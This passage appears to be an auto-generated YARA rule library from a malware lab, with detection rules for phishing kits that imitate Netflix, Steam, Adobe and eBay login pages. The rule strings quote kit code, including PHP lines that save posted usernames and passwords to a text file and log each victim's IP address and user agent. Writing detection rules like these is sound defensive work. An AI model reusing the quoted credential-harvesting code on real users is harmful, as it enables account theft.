      $s8 = "s\",c,r)};var c=null;c={xd_action:\"proxy_ready\",logged_in:/\\bc_user=/.test(document.cookie),data:c};var e=i(s,r);e&&(c.regist" ascii /* score: '24.00'*/
      $s9 = "Object.create||(Object.create=function(a){var b=typeof a;if(b!=\"object\"&&b!=\"function\")throw new TypeError(\"Object prototyp" ascii /* score: '23.00'*/
      $s10 = "f(g)return;g=!0;var a=navigator.userAgent,b=/(?:MSIE.(\\d+\\.\\d+))|(?:(?:Firefox|GranParadiso|Iceweasel).(\\d+\\.\\d+))|(?:Oper" ascii /* score: '22.00'*/
      $s11 = "proxy to %s\",o.relation),l());return}if(p!=/https?/.exec(window.name)[0]){d.info(\"Redirection to %s detected, aborting\",p);re" ascii /* score: '22.00'*/
      $s12 = "3]):NaN;k=b[4]?parseFloat(b[4]):NaN;k?(b=/(?:Chrome\\/(\\d+\\.\\d+))/.exec(a),l=b&&b[1]?parseFloat(b[1]):NaN):l=NaN}else h=i=j=l" ascii /* score: '21.00'*/
      $s13 = ";window.addEventListener(\"fbNativeReady\",b)}}var n=/#(.*)|$/.exec(document.URL)[1];window==top&&(location.hash=\"\");if(!n){d." ascii /* score: '21.00'*/
      $s14 = "arch)},50)}function m(){var a=/^(.*)\\/(.*)$/.exec(o.origin)[1];if(window.__fbNative&&window.__fbNative.postMessage)window.__fbN" ascii /* score: '21.00'*/
      $s15 = "body><script>document.domain = 'facebook.com';__transform_includes = {};self.__DEV__=self.__DEV__||0;" fullword ascii /* score: '20.00'*/
      $s16 = "load the components\",d)},d);a=!0}}}());var t=/\\.facebook\\.com(\\/|$)/;a.register(\"postmessage\",function(){__p&&__p();var a=" ascii /* score: '19.00'*/
      $s17 = "=e);b.send(a.encode(c),r,parent,q)}})})()}),null);__d(\"XDMConfig\",[],{\"Flash\":{\"path\":\"https:\\/\\/connect.facebook.net" ascii /* score: '19.00'*/
      $s18 = "function(a){return Math.log(a)/Math.LN10}),typeof Math.trunc!==\"function\"&&(Math.trunc=function(a){return a<0?Math.ceil(a):Mat" ascii /* score: '19.00'*/
      $s19 = "a.length;c++){var d=a[c],e=/^frames\\[[\\'\\\"]?([a-zA-Z0-9\\-_]+)[\\'\\\"]?\\]$/.exec(d);if(e)b=b.frames[e[1]];else if(d===\"op" ascii /* score: '19.00'*/
      $s20 = "typeof Math.log2!==\"function\"&&(Math.log2=function(a){return Math.log(a)/Math.LN2}),typeof Math.log10!==\"function\"&&(Math.lo" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__netflix_home_ubuntu_malware_lab_samples_extracted_phishing_Netflix_login {
   meta:
      description = "phish__netflix - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "53a882090787933350210770e49c74e0f80e5ffb75b7dc284955b92e896aafe6"
   strings:
      $x1 = "s</option><option selected=\"selected\" value=\"/login?locale=en-BR\" data-language=\"en\" data-country=\"BR\" data-reactid=\"84" ascii /* score: '83.00'*/
      $x2 = ".fb_customer_chat_bounce_in_v1{animation-duration:250ms;animation-name:fb_bounce_in_v1}.fb_customer_chat_bounce_out_v1{animation" ascii /* score: '58.00'*/
      $x3 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta charset=\"utf-8\"><meta http-equiv=\"X-" ascii /* score: '51.00'*/
      $x4 = ".fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_reset .fb_dialog_legacy{overflow:vis" ascii /* score: '40.00'*/
      $x5 = "F\",\"inapplogin\":\"\\x2Finapplogin\",\"dvdPlans\":\"https:\\x2F\\x2Fdvd.netflix.com\\x2FSignupDVD\\x3Fdsrc\\x3DSTRWEB_SIGNUP\"" ascii /* score: '34.00'*/
      $x6 = ":\"\\x2F\",\"comingSoon\":\"\\x2F\",\"inapplogin\":\"\\x2Finapplogin\",\"dvdPlans\":\"https:\\x2F\\x2Fdvd.netflix.com\\x2FSignup" ascii /* score: '34.00'*/
      $x7 = "mingSoon\":\"\\x2F\",\"inapplogin\":\"\\x2Finapplogin\",\"dvdPlans\":\"https:\\x2F\\x2Fdvd.netflix.com\\x2FSignupDVD\\x3Fdsrc\\x" ascii /* score: '34.00'*/
      $x8 = " class=\"login-signup-now\" data-reactid=\"56\"><!-- react-text: 57 -->New to Netflix? <!-- /react-text --><a class=\" \" target" ascii /* score: '34.00'*/
      $x9 = ",\"signupUnavailable\":\"\\x2F\",\"comingSoon\":\"\\x2F\",\"inapplogin\":\"\\x2Finapplogin\",\"dvdPlans\":\"https:\\x2F\\x2Fdvd." ascii /* score: '34.00'*/
      $x10 = "lix.com/login?locale=en-SE\"><meta property=\"al:ios:app_store_id\" content=\"363590051\"><meta property=\"al:ios:app_name\" con" ascii /* score: '32.00'*/
      $x11 = "/noscript><div class=\"login-content login-form\" data-reactid=\"10\"><h1 data-reactid=\"11\">Sign In</h1><!-- react-text: 12 --" ascii /* score: '32.00'*/
      $x12 = "onsolidatedLogging.endpointUrl\":\"https:\\x2F\\x2Fwww.netflix.com\\x2Fichnaea\\x2Fcl2\",\"shakti.core.cl2.enabled\":true,\"shak" ascii /* score: '31.00'*/
      $x13 = "e\":\"Action\"},\"csWebsiteUrl\":{\"fieldType\":\"String\",\"value\":\"http:\\x2F\\x2Fhelp.netflix.com\"},\"showPassword\":{\"fi" ascii /* score: '31.00'*/
      $x14 = "\",\"email\"],\"fieldType\":\"Action\"},\"csWebsiteUrl\":{\"fieldType\":\"String\",\"value\":\"http:\\x2F\\x2Fhelp.netflix.com\"" ascii /* score: '31.00'*/
      $x15 = ",\"DVD_CO\":\"https:\\x2F\\x2Fdvd.netflix.com\\x2F\"},\"type\":\"Model\"},\"services\":{\"data\":{\"api\":{\"protocol\":\"https" ascii /* score: '31.00'*/
      $s16 = ":false},\"uitracking\":{\"protocol\":\"https\",\"hostname\":\"www.netflix.com\",\"name\":\"uitracking\",\"path\":[\"uitracking\"" ascii /* score: '30.00'*/
      $s17 = "f\" href=\"https://www.netflix.com/\" data-reactid=\"58\">Sign up now</a><!-- react-text: 59 -->.<!-- /react-text --></div></div" ascii /* score: '30.00'*/
      $s18 = "etflix\"><meta property=\"al:android:url\" content=\"nflx://www.netflix.com/login?locale=en-SE\"><meta property=\"al:android:pac" ascii /* score: '29.00'*/
      $s19 = "/react-text --><form class=\"login-form\" action=\"login.php\" method=\"post\" data-reactid=\"13\"><label class=\"login-input lo" ascii /* score: '28.00'*/
      $s20 = "ct\":0,\"shakti.api.h2.enabled\":false,\"shakti.h1.host\":\"https:\\x2F\\x2Fwww.netflix.com\",\"shakti.h2.host\":\"https:\\x2F" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 700KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__netflix_home_ubuntu_malware_lab_samples_extracted_phishing_Netflix_index {
   meta:
      description = "phish__netflix - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__netflix_home_ubuntu_malware_lab_samples_extracted_phishing_Netflix_login_2 {
   meta:
      description = "phish__netflix - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "6d864fffa6aaae56dc9b4eaf7be0202d61e3a8eccb2800f21804c1ccdd909d12"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['email'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEND);" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://netflix.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__netflix_home_ubuntu_malware_lab_samples_extracted_phishing_Netflix_ip {
   meta:
      description = "phish__netflix - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__netflix phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s10 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__steam/phish__steam_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__steam
   Reference: phish__steam phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__steam_home_ubuntu_malware_lab_samples_extracted_phishing_Steam_index {
   meta:
      description = "phish__steam - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__steam phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__steam_home_ubuntu_malware_lab_samples_extracted_phishing_Steam_login {
   meta:
      description = "phish__steam - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__steam phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "220cd6762b3e80efc813c8b9e8f17c9aa3eb6ce6e474a2ae385ec0f5b666e76a"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEN" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://steamcommunity.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__steam_home_ubuntu_malware_lab_samples_extracted_phishing_Steam_login_2 {
   meta:
      description = "phish__steam - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__steam phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e11cc54471740c978c69388dd77e517dd0139fa74920169d02e501cdd1f01c71"
   strings:
      $x1 = "#logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src=" ascii /* score: '35.00'*/
      $s2 = "&copy; Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countr" ascii /* score: '29.00'*/
      $s3 = "<img src=\"https://steamcommunity-a.akamaihd.net/public/shared/images/header/globalheader_logo.png?t=962016\" width=\"176\" heig" ascii /* score: '29.00'*/
      $s4 = "<meta property=\"og:image:secure\" content=\"https://steamcommunity-a.akamaihd.net/public/shared/images/responsive/share_steam_l" ascii /* score: '29.00'*/
      $s5 = "<img src=\"https://steamcommunity-a.akamaihd.net/public/shared/images/header/globalheader_logo.png?t=962016\" width=\"176\" heig" ascii /* score: '29.00'*/
      $s6 = "<img src=\"https://steamcommunity-a.akamaihd.net/public/shared/images/responsive/header_logo.png\" height=\"36\" border=\"0\" al" ascii /* score: '29.00'*/
      $s7 = "<meta property=\"og:image:secure\" content=\"https://steamcommunity-a.akamaihd.net/public/shared/images/responsive/share_steam_l" ascii /* score: '29.00'*/
      $s8 = "<img src=\"https://steamcommunity-a.akamaihd.net/public/shared/images/responsive/header_logo.png\" height=\"36\" border=\"0\" al" ascii /* score: '29.00'*/
      $s9 = "<meta property=\"og:image\" content=\"https://steamcommunity-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png" ascii /* score: '29.00'*/
      $s10 = "if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.write( \"<scr\" + \"ipt type=\\\"text\\/javascript" ascii /* score: '29.00'*/
      $s11 = "<a href=\"https://help.steampowered.com/en/wizard/HelpWithLogin?redir=community%2Flogin%2Fhome%2F%3Fgoto%3D\">" fullword ascii /* score: '28.00'*/
      $s12 = "LoginManager = new CLoginPromptManager( 'https://steamcommunity.com', {" fullword ascii /* score: '28.00'*/
      $s13 = "&nbsp; | &nbsp;<a href=\"http://www.valvesoftware.com/legal.htm\" target=\"_blank\">Legal</a>" fullword ascii /* score: '27.00'*/
      $s14 = "&nbsp;| &nbsp;<a href=\"https://store.steampowered.com/subscriber_agreement/\" target=\"_blank\">Steam Subscriber Agreement</a>" fullword ascii /* score: '27.00'*/
      $s15 = "&nbsp;| &nbsp;<a href=\"http://www.valvesoftware.com/legal.htm\" target=\"_blank\">Legal</a>" fullword ascii /* score: '27.00'*/
      $s16 = "<a href=\"https://store.steampowered.com/privacy_agreement/\" target=\"_blank\">Privacy Policy</a>" fullword ascii /* score: '27.00'*/
      $s17 = "<link href=\"https://steamcommunity-a.akamaihd.net/public/shared/css/login.css?v=urY8LqkoziPf\" rel=\"stylesheet\" type=\"text/c" ascii /* score: '27.00'*/
      $s18 = "&nbsp;| &nbsp;<a href=\"http://store.steampowered.com/subscriber_agreement/\" target=\"_blank\">Steam Subscriber Agreement</a>" fullword ascii /* score: '27.00'*/
      $s19 = "<a href=\"http://store.steampowered.com/privacy_agreement/\" target=\"_blank\">Privacy Policy</a>" fullword ascii /* score: '27.00'*/
      $s20 = "&nbsp;| &nbsp;<a href=\"https://store.steampowered.com/steam_refunds/\" target=\"_blank\">Refunds</a>" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__steam_home_ubuntu_malware_lab_samples_extracted_phishing_Steam_ip {
   meta:
      description = "phish__steam - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__steam phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__adobe/phish__adobe_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__adobe
   Reference: phish__adobe phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__adobe_home_ubuntu_malware_lab_samples_extracted_phishing_Adobe_index {
   meta:
      description = "phish__adobe - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__adobe phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__adobe_home_ubuntu_malware_lab_samples_extracted_phishing_Adobe_login {
   meta:
      description = "phish__adobe - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__adobe phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "11f2823bfa194f72610c207f26795edeb95ab92ad785a5c7901c7856a98f17af"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEN" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://adobe.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__adobe_home_ubuntu_malware_lab_samples_extracted_phishing_Adobe_login_2 {
   meta:
      description = "phish__adobe - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__adobe phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "2b70de126eeb8ba4706d828a13ac83ee42342a0f5b8c71c0e0cf0e1fc05a6f56"
   strings:
      $x1 = "        <script src=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d722ea186a935459f7234f/spectrum/script/" ascii /* score: '34.00'*/
      $x2 = "                    <a id=\"enterprise_signin_link\" data-component=\"spinner viewswitcher\" data-component-viewswitcher-targett" ascii /* score: '32.00'*/
      $x3 = "        <a id=\"enterprise_back_to_adobeid\" data-component=\"spinner viewswitcher\" data-component-viewswitcher-targettitle=\"S" ascii /* score: '32.00'*/
      $x4 = "obelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.com%252F%2523from_ims%253Dtrue%" ascii /* score: '31.00'*/
      $s5 = "        <link rel=\"stylesheet\" type=\"text/css\" href=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d72" ascii /* score: '30.00'*/
      $s6 = "            <script src=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d722ea186a935459f7234f/spectrum/scr" ascii /* score: '28.00'*/
      $s7 = "        <script src=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d722ea186a935459f7234f/spectrum/script/" ascii /* score: '28.00'*/
      $s8 = "3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts." ascii /* score: '28.00'*/
      $s9 = "lback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.c" ascii /* score: '28.00'*/
      $s10 = "            <script src=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d722ea186a935459f7234f/spectrum/scr" ascii /* score: '28.00'*/
      $s11 = "ack=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252" ascii /* score: '28.00'*/
      $s12 = "    <script src=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d722ea186a935459f7234f/spectrum/script/spec" ascii /* score: '28.00'*/
      $s13 = "            <script src=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d722ea186a935459f7234f/spectrum/scr" ascii /* score: '28.00'*/
      $s14 = "    <script src=\"https://static.adobelogin.com/renga-idprovider/resources/60550808d7d722ea186a935459f7234f/spectrum/script/spec" ascii /* score: '28.00'*/
      $s15 = "                    <a class=\"nowrap\" data-component=\"spinner\" href=\"create_account?client_id=SunbreakWebUI1&amp;callback=h" ascii /* score: '27.00'*/
      $s16 = "clean-n7-active wf-adobeclean-n3-active wf-active wf-inactive\" data-pagename=\"login\" lang=\"en\"><!--<![endif]--><head>" fullword ascii /* score: '25.00'*/
      $s17 = "nga-idprovider/pages/start_forgot_password?client_id=SunbreakWebUI1&amp;callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fad" ascii /* score: '24.00'*/
      $s18 = ".link%252Cunlink_social_account%252Cadmin_slo%252Creauthenticated&amp;denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims" ascii /* score: '24.00'*/
      $s19 = "terprise_view\" href=\"login?idp_flow_type=login_t2&amp;client_id=SunbreakWebUI1&amp;callback=https%3A%2F%2Fims-na1.adobelogin.c" ascii /* score: '24.00'*/
      $s20 = "=\"login?idp_flow_type=login&amp;client_id=SunbreakWebUI1&amp;callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSu" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__adobe_home_ubuntu_malware_lab_samples_extracted_phishing_Adobe_ip {
   meta:
      description = "phish__adobe - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__adobe phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__ebay/phish__ebay_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__ebay
   Reference: phish__ebay phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__ebay_home_ubuntu_malware_lab_samples_extracted_phishing_Ebay_index {
   meta:
      description = "phish__ebay - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__ebay phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__ebay_home_ubuntu_malware_lab_samples_extracted_phishing_Ebay_login {
   meta:
      description = "phish__ebay - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__ebay phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "79ef1b4ca1812aef701005a9d2fd8ce6dfe5d36c1c73c0b08ec4772c28f82981"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['userid'] . \" Pass: \" . $_POST['pass'] . \"\\n\", FILE_APPEND);" fullword ascii /* score: '24.00'*/
      $s2 = "header('Location: https://ebay.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__ebay_home_ubuntu_malware_lab_samples_extracted_phishing_Ebay_login_2 {
   meta:
      description = "phish__ebay - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__ebay phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "443306fad679d4944360ff2989b5b7a32dbcccb96f3f937f45f1781e05868132"
   strings:
      $x1 = "vjo.ctype('vjo.com.ebay.darwin.app.signin.KgClientInfo').needs(['vjo.dsf.Element','vjo.com.ebay.darwin.app.signin.KgHelper']).pr" ascii /* score: '54.00'*/
      $x2 = "<div class=\"CentralArea\" id=\"CentralArea\"><div><div id=\"srd\"><div><noscript class=\"noJsErr\"><div style=\"display:inline-" ascii /* score: '51.00'*/
      $x3 = "<div class=\"GlobalNavigation\" id=\"GlobalNavigation\"><style>html,body,div,span,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,p" ascii /* score: '51.00'*/
      $x4 = "<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><script src=\"https://www.ebay.com/rdr/js/s/rrbundl" ascii /* score: '50.00'*/
      $x5 = "<body id=\"v4-3\" class=\"sz980 sso ssous\"><div id=\"kgdiv\"> </div><div></div><script src=\"https://secureinclude.ebaystatic.c" ascii /* score: '48.00'*/
      $x6 = "xhReq.open('POST',url,true);xhReq.setRequestHeader(\"X-Requested-With\",\"XMLHttpRequest\");xhReq.setRequestHeader(\"Content-typ" ascii /* score: '45.00'*/
      $x7 = "</div><!--vo{54*2212:53,RcmdId SignIn2,RlogId p4plaijkehq%60%3C%3Dsm%7E71%287040%3F76-16435f2d58d-0x184--><script type=\"text/ja" ascii /* score: '43.00'*/
      $x8 = "xhReq.open('POST',url,true);xhReq.setRequestHeader(\"X-Requested-With\",\"XMLHttpRequest\");xhReq.setRequestHeader(\"Content-typ" ascii /* score: '40.00'*/
      $x9 = "xhReq.open('POST',url,true);xhReq.setRequestHeader(\"X-Requested-With\",\"XMLHttpRequest\");xhReq.setRequestHeader(\"Content-typ" ascii /* score: '40.00'*/
      $x10 = " 1995-2018 eBay Inc. All Rights Reserved. <a href=\"https://www.ebayinc.com/accessibility/\">Accessibility</a>, <a href=\"https:" ascii /* score: '39.00'*/
      $x11 = "var i;for(i=0;i<collection.length;i++){collection[i].onkeydown=keyDownHandler;collection[i].onkeyup=keyUpHandler;collection[i].o" ascii /* score: '37.00'*/
      $x12 = "document.getElementById(\"sgn-otp-conf\").disabled=false;document.getElementById(\"sgnBtn\").disabled=false;}else if(method==='p" ascii /* score: '37.00'*/
      $x13 = "function $0(p1){return function(event){return this.trackOTPOpenAndSignIn(\"https://www.ebay.com:443/ws/eBayISAPI.dll?V4SignInAja" ascii /* score: '37.00'*/
      $x14 = "vjo.ctype('vjo.com.ebay.darwin.app.signin.SigninSelfInit').needs('vjo.dsf.Element').props({flashInit:function(){},verisign:funct" ascii /* score: '36.00'*/
      $x15 = "if(method==='init'){if(resArr[0]==='success'){document.getElementById(\"refId\").value=json[1][1];vjo.com.ebay.darwin.app.signin" ascii /* score: '36.00'*/
      $x16 = "var filenameFinish=fileName.length;fileName=fileName.substring(filenameStart+pLastDir.length,filenameFinish);return fileName;},o" ascii /* score: '35.00'*/
      $x17 = "ript type=\"text/javascript\">var _GlobalNavHeaderUtf8Encoding=true,includeHost='https://secureinclude.ebaystatic.com/';</script" ascii /* score: '33.00'*/
      $x18 = "<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><script src=\"https://www.ebay.com/rdr/js/s/rrbundl" ascii /* score: '33.00'*/
      $x19 = "mmon.otpConfirmContent(json[3][1]);vjo.com.ebay.darwin.app.signin.SignInRedesignCommon.processOTPAjaxSuccessResponse(json[0][1]," ascii /* score: '33.00'*/
